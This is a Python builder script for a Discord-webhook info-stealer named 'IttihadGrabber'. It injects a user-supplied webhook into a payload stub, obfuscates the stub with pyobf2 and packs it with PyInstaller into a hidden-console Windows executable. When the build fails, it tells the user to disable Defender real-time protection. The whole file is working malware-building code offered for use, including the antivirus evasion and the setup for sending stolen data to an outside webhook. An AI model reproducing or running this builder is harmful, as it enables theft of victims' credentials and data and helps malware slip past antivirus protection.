import os
import sys
import shutil
import base64
import subprocess
import tempfile
import time
import urllib.request

PYTHON_VERSION = "3.11.9"
PYTHON_URL = f"https://www.python.org/ftp/python/{PYTHON_VERSION}/python-{PYTHON_VERSION}-amd64.exe"
WORK_DIR = r"C:\io_build"
DEFAULT_OUTPUT_FOLDER = "Dufelt"
DEFAULT_OUTPUT_NAME = "IttihadGrabber.exe"

STUB_CANDIDATES = [
    "Components/stub.py",
    "stub.py",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "Components", "stub.py"),
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "stub.py"),
]

def clr(text, color="white"):
    m = {"red":"91","green":"92","yellow":"93","blue":"94","cyan":"96","magenta":"95","white":"97","gray":"90"}
    return f"\033[{m.get(color,'97')}m{text}\033[0m"

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    print(clr(r"""
  _____ _   _   _ _               _  _____           _     _               
 |_   _| | | | (_) |             | |/ ____|         | |   | |              
   | | | |_| |_ _| |__   __ _  __| | |  __ _ __ __ _| |__ | |__   ___ _ __ 
   | | | __| __| | '_ \ / _` |/ _` | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|
  _| |_| |_| |_| | | | | (_| | (_| | |__| | | | (_| | |_) | |_) |  __/ |   
 |_____|\__|\__|_|_| |_|\__,_|\__,_|\_____|_|  \__,_|_.__/|_.__/ \___|_|   
                                                                           
                                                                           
""", "cyan"))
    print(clr("          IttihadGrabber Builder - by @Zlmokah\n", "magenta"))

def get_input(prompt, default=""):
    suffix = f" [{default}]" if default else ""
    try:
        v = input(clr(f"  > {prompt}{suffix}: ", "magenta")).strip()
    except EOFError:
        v = ""
    return v if v else default

def valid_webhook(v):
    return ("/api/webhooks/" in v) and ("discord" in v)

def find_python():
    candidates = [
        r"C:\Python311\python.exe",
        r"C:\Program Files\Python311\python.exe",
        r"C:\Program Files (x86)\Python311\python.exe",
        os.path.join(os.getenv("LOCALAPPDATA", ""), "Programs", "Python", "Python311", "python.exe"),
        "python", "py",
    ]
    for p in candidates:
        try:
            r = subprocess.run([p, "--version"], capture_output=True, timeout=5)
            if r.returncode == 0:
                return p
        except Exception:
            pass
    return None

def ensure_python():
    py = find_python()
    if py:
        print(clr(f"  [ok] python: {py}", "green"))
        return py
    print(clr("  [!] python not found, downloading...", "yellow"))
    installer = os.path.join(tempfile.gettempdir(), "python_installer.exe")
    try:
        urllib.request.urlretrieve(PYTHON_URL, installer)
    except Exception as e:
        print(clr(f"  [!] download failed: {e}", "red"))
        return None
    print(clr("  [*] installing python...", "cyan"))
    try:
        subprocess.run(
            [installer, "/quiet", "InstallAllUsers=1", "PrependPath=1",
             "Include_test=0", "Include_pip=1", "Include_launcher=1",
             "TargetDir=C:\\Python311"],
            timeout=600,
        )
    except Exception:
        pass
    try:
        os.remove(installer)
    except Exception:
        pass
    time.sleep(3)
    py = find_python()
    if py:
        print(clr(f"  [ok] installed: {py}", "green"))
        return py
    print(clr("  [!] python still not found after install", "red"))
    return None

def run(cmd, timeout=900000, cwd=None, quiet=False):
    try:
        p = subprocess.run(cmd, shell=isinstance(cmd, str), capture_output=True,
                           timeout=timeout / 1000, text=True, cwd=cwd,
                           encoding="utf-8", errors="ignore")
        if not quiet:
            if p.stdout:
                print(p.stdout.rstrip())
            if p.stderr:
                print(clr(p.stderr.rstrip(), "gray"))
        return p.returncode == 0
    except Exception as e:
        if not quiet:
            print(clr(f"  [!] {e}", "red"))
        return False

def find_stub():
    for p in STUB_CANDIDATES:
        try:
            if os.path.isfile(p):
                with open(p, "rb") as f:
                    raw = f.read()
                if raw[:3] == b"\xef\xbb\xbf":
                    raw = raw[3:]
                text = raw.decode("utf-8", errors="ignore")
                if "@@WEBHOOK@@" in text:
                    return p, text
        except Exception:
            pass
    return None, None

def patch_stub(text, webhook):
    return text.replace("@@WEBHOOK@@", webhook)

OBF_SCRIPT = r'''
import sys, ast
sys.setrecursionlimit(1000000)
try:
    import pyobf2.lib as obf
except Exception as e:
    print("PYOBF2_IMPORT_FAIL:" + str(e))
    sys.exit(2)
config = {
    "removeTypeHints.enabled": True,
    "fstrToFormatSeq.enabled": True,
    "encodeStrings.enabled": True,
    "encodeStrings.mode": "xortable",
    "floatsToComplex.enabled": True,
    "intObfuscator.enabled": True,
    "intObfuscator.mode": "decode",
    "renamer.enabled": False,
    "replaceAttribSet.enabled": True,
    "unicodeTransformer.enabled": True,
}
try:
    obf.set_config_dict(config)
except Exception:
    pass
src, dst = sys.argv[1], sys.argv[2]
with open(src, "r", encoding="utf-8") as f:
    code = f.read()
tree = ast.parse(code)
obf_tree = obf.do_obfuscation_single_ast(tree, src)
with open(dst, "w", encoding="utf-8") as f:
    f.write(ast.unparse(obf_tree))
print("PYOBF2_OK")
'''

def obfuscate_python(py_exe, src, dst):
    print(clr("  [*] obfuscating python stub...", "cyan"))
    probe = subprocess.run(
        [py_exe, "-c", "import pyobf2.lib"],
        capture_output=True, text=True, timeout=60,
        encoding="utf-8", errors="ignore",
    )
    if probe.returncode != 0:
        print(clr("  [*] installing pyobf2...", "yellow"))
        run([py_exe, "-m", "pip", "install", "--upgrade",
             "git+https://github.com/willshiao/pyobf2.git"],
            timeout=600000, quiet=True)
        probe = subprocess.run(
            [py_exe, "-c", "import pyobf2.lib"],
            capture_output=True, text=True, timeout=60,
            encoding="utf-8", errors="ignore",
        )
        if probe.returncode != 0:
            print(clr("  [!] pyobf2 not available, skipping obfuscation.", "yellow"))
            return False

    script_path = os.path.join(os.path.dirname(dst), "_obf_worker.py")
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(OBF_SCRIPT)

    p = subprocess.run(
        [py_exe, script_path, src, dst],
        capture_output=True, text=True, timeout=600,
        encoding="utf-8", errors="ignore",
    )
    out = (p.stdout or "") + (p.stderr or "")
    if "PYOBF2_OK" in out and os.path.isfile(dst) and os.path.getsize(dst) > 0:
        print(clr(f"  [ok] obfuscated ({os.path.getsize(dst)} bytes)", "green"))
        return True

    print(clr("  [!] obfuscation failed, skipping.", "yellow"))
    return False

def open_folder(path):
    try:
        if os.name == "nt":
            os.startfile(path)
        elif sys.platform == "darwin":
            subprocess.Popen(["open", path])
        else:
            subprocess.Popen(["xdg-open", path])
    except Exception:
        pass

def build(webhook):
    if not valid_webhook(webhook):
        print(clr("  [!] invalid webhook url!", "red"))
        return False

    print(clr("  [*] reading stub...", "cyan"))
    stub_path, text = find_stub()
    if not stub_path:
        print(clr("  [!] stub.py not found or @@WEBHOOK@@ missing", "red"))
        return False
    print(clr(f"  [ok] stub: {stub_path}", "green"))

    py = ensure_python()
    if not py:
        return False

    print(clr("  [*] preparing packages...", "cyan"))
    run([py, "-m", "ensurepip", "--upgrade"], timeout=120000, quiet=True)
    run([py, "-m", "pip", "install", "--upgrade", "pip"], timeout=300000, quiet=True)
    run([py, "-m", "pip", "install", "--upgrade", "pyaes", "urllib3", "pyinstaller"],
        timeout=900000, quiet=True)

    os.makedirs(WORK_DIR, exist_ok=True)
    wd = os.path.join(WORK_DIR, "b_" + base64.b16encode(os.urandom(4)).decode().lower())
    if os.path.isdir(wd):
        shutil.rmtree(wd, ignore_errors=True)
    os.makedirs(wd, exist_ok=True)

    stub_tmp = os.path.join(wd, "stub.py")
    try:
        with open(stub_tmp, "w", encoding="utf-8", newline="\n") as f:
            f.write(patch_stub(text, webhook))
    except Exception as e:
        print(clr(f"  [!] cannot write stub: {e}", "red"))
        shutil.rmtree(wd, ignore_errors=True)
        return False
    print(clr(f"  [ok] injected ({os.path.getsize(stub_tmp)} bytes)", "green"))

    build_src = stub_tmp
    obf_tmp = os.path.join(wd, "stub_obf.py")
    if obfuscate_python(py, stub_tmp, obf_tmp):
        build_src = obf_tmp

    name = os.path.splitext(DEFAULT_OUTPUT_NAME)[0]
    print(clr("  [*] compiling with pyinstaller...", "cyan"))
    args = [
        py, "-m", "PyInstaller", "--onefile", "--noconfirm", "--clean",
        "--noconsole",
        "--hidden-import=pyaes", "--hidden-import=urllib3",
        f"--distpath={wd}", f"--workpath={os.path.join(wd, 'build')}",
        f"--specpath={wd}", f"--name={name}", build_src,
    ]
    ok = run(args, timeout=900000, cwd=wd, quiet=True)
    if not ok:
        print(clr("\n  [!] build failed. antivirus likely blocked it.", "red"))
        print(clr("      disable defender real-time protection and retry.", "yellow"))
        shutil.rmtree(wd, ignore_errors=True)
        return False

    built = os.path.join(wd, name + ".exe")
    if not os.path.isfile(built):
        exes = [f for f in os.listdir(wd) if f.lower().endswith(".exe")]
        if exes:
            built = os.path.join(wd, exes[0])
        else:
            print(clr("  [!] exe was not created", "red"))
            shutil.rmtree(wd, ignore_errors=True)
            return False

    base = os.path.dirname(os.path.abspath(__file__))
    out_dir = os.path.join(base, DEFAULT_OUTPUT_FOLDER)
    os.makedirs(out_dir, exist_ok=True)
    out_path = os.path.join(out_dir, DEFAULT_OUTPUT_NAME)
    try:
        if os.path.isfile(out_path):
            os.remove(out_path)
        shutil.copy2(built, out_path)
    except Exception as e:
        print(clr(f"  [!] copy failed: {e}", "red"))
        shutil.rmtree(wd, ignore_errors=True)
        return False
    finally:
        shutil.rmtree(wd, ignore_errors=True)

    print(clr(f"\n  [ok] build complete: {out_path}", "green"))
    open_folder(out_dir)
    return True

def main():
    while True:
        clear_screen()
        banner()
        print(clr("  paste your discord webhook url and press Enter (or 'q' to quit):\n", "cyan"))
        webhook = get_input("webhook")

        if webhook.lower() in ("q", "quit", "exit"):
            break

        if not valid_webhook(webhook):
            print(clr("\n  [!] invalid webhook. try again.", "red"))
            time.sleep(1.5)
            continue

        build(webhook)

        print(clr("\n  press Enter to continue...", "gray"))
        try:
            input()
        except EOFError:
            pass

if __name__ == "__main__":
    try:
        if os.name == "nt":
            os.system("color 0F")
        main()
    except KeyboardInterrupt:
        print(clr("\n  [!] interrupted.", "yellow"))
    except Exception as e:
        print(clr(f"\n  [!] critical error: {e}", "red"))
        try:
            input(clr("  press enter to exit...", "gray"))
        except Exception:
            pass
